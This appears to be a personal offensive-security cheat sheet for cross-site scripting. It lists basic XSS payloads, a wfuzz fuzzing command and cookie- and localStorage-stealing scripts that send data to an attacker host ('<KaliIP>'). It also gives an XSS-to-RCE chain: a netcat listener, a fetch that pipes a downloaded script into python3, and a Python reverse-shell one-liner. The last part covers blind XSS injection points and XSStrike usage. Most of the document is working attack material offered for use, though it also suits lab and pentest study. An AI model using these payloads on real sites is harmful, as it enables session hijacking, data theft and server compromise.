# **XSS**

#### **Command to start serving the files**
```
python3 -m http.server 80
```

### Basic Payloads
```
<script>alert('XSS')</script>
"><script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>

<img src=1 onerror=alert(1)>
<><img src=1 onerror=alert(1)>
<img src=x onerror=alert('XSS');>

<svgonload=alert(1)>
"><svg onload=alert(1)>

javascript:alert(document.cookie)

```

### XSS Fuzzing
```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "http://example.com/index.php?id=FUZZ"
```

### Stealing Cookie
- Payload       
```
<script src="http://<KaliIP>:80/xss.js"></script>
```      

```
<img src="x" onerror="var s=document.createElement('script'); s.src='http://<KaliIP>:80/xss.js'; document.head.appendChild(s);">

```

- Content of xss.js
```
fetch("http://<KaliIP>:80/exfil?data="+encodeURIComponent(document.cookie))
```

```
document.write('<img src="http://<KaliIP>:80/?exfil='+document.cookie+'" />');
```

```
window.location.href="http://<KaliIP>:80/?exfil=" + btoa(window.document.body.innerHTML);
```

```
fetch("http://<KaliIP>:80/exfil?data="+encodeURIComponent(JSON.stringify(localStorage)))
```


### XSS to RCE
- Start netcat on port 443 to take reverse shell.
```
nc -nlvp 443
```

- Payload       
```
<script src="http://<KaliIP>:80/xss_to_rce.js"></script>
```   

- Create a XSS payload (xss_to_rce.js) that will trigger RCE.
First try to run a simple curl command to see if command injection is possible

```
fetch('http://localhost:3000/run_command', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: "cmd=curl http://<KaliIP>:443"
})
```

```
fetch('http://localhost:3000/run_command', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: "cmd=curl http://<KaliIP>:80/rce.py|python3"
})
```

- Create a Python reverse shell call rce.py and host it on port 80 in our Kali machine.
```
import os,pty,socket;s=socket.socket();s.connect(("<KaliIP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")
```

### Blind XSS endpoint
- Contact forms
- Ticket support
- Referer Header
    - Custom Site Analytics
    - Administrative Panel logs
- User Agent
    - Custom Site Analytics
    - Administrative Panel logs
- Comment Box
    - Administrative Panel

### Automated tools 

- **XSStrike**
```
cd /home/amrityam/kali/offsec/tools/XSStrike
sudo apt update
sudo apt install -y python3-venv


python3 -m venv .venv
source .venv/bin/activate

python -m pip install --upgrade pip setuptools wheel

pip install -r requirements.txt
```

#### GET Requests
- Basic GET parameter test
```
python3 xsstrike.py -u "http://example.com/search.php?q=test"
```
- GET with multiple parameters
```
python3 xsstrike.py -u "http://example.com/page.php?cat=1&id=10"
```
- GET with cookies (authenticated testing)
```
python3 xsstrike.py -u "http://example.com/search.php?q=test" --cookie "PHPSESSID=abc123; role=user"
```
- GET with custom headers
```
python3 xsstrike.py -u "http://example.com/search.php?q=test" --headers "User-Agent: Mozilla/5.0; X-Test: xsstrike"
```
- GET with crawling enabled
```
python3 xsstrike.py -u "http://example.com" --crawl
```

#### POST Requests
- Basic POST request
```
python3 xsstrike.py -u "http://example.com/login.php" --data "username=test&password=test"
```
- JSON POST request
```
python3 xsstrike.py -u "http://example.com/api/search" \
--data '{"query":"test"}' \
--json
```
- POST with cookies
```
python3 xsstrike.py -u "http://example.com/profile/update" \
--data "bio=test" \
--cookie "auth_token=xyz123"
```
- POST with custom headers
```
python3 xsstrike.py -u "http://example.com/submit.php" \
--data "comment=test" \
--headers "Content-Type: application/x-www-form-urlencoded"
```

### Useful Options
- Skip DOM-based tests (faster)
```
--skip-dom
```
- Blind XSS payload injection
```
--blind http://your-blind-xss-host
```
- Increase test depth
```
-l 5
```